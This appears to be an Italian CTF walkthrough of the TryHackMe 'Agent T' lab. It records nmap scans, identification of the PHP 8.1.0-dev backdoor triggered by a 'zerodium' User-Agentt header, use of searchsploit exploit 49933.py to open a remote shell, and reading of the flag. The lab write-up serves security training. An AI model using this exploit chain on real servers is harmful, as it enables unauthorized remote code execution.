#tryhackmelabs #laboratorio 

https://tryhackme.com/room/agentt

L'agente T ha scoperto questo sito web, che sembra abbastanza innocente, ma c'è qualcosa di strano nel modo in cui risponde il server...

```
nmap -Pn -O -v -p- 10.10.165.177
```

```
PORT   STATE SERVICE
80/tcp open  http
```

```
http://10.10.165.177/
```
visitiamo il sito ma nelle pagine non troviamo molto 
e neanche whatweb ci restituisce info utili

riproviamo con nmap
```
nmap -sVC -v -p80 10.10.165.177
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title:  Admin Dashboard
MAC Address: 02:17:3F:D0:9F:AD (Unknown)

```

proviamo a vedere cosa troviamo su PHP 8.1.0-dev

https://flast101.github.io/php-8.1.0-dev-backdoor-rce/

in pratica questa vulnerabilità esegue il codice PHP dall'intestazione HTTP dell'useragent, se la stringa inizia con "zerodium"

vediamo cosa abbiamo di utile
```
searchsploit PHP 8.1.0 dev
```

```
root@ip-10-10-85-96:~# searchsploit PHP 8.1.0 dev
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                             | php/webapps/49933.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@ip-10-10-85-96:~# 

```

```
searchsploit -m php/webapps/49933.py
```

```
python3 49933.py
```

```
root@ip-10-10-85-96:~# python3 49933.py
Enter the full host url:
http://10.10.165.177/

Interactive shell is opened on http://10.10.165.177/ 
Can't acces tty; job crontol turned off.
$ ls
404.html
blank.html
css
gulpfile.js
img
index.php
js
package-lock.json
package.json
scss
vendor

```

```
whoami
```
cerchiamo la flag

```
$ ls /
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ cat /flag.txt
flag{xxxxxxxxxxxxxxxxxx}

```
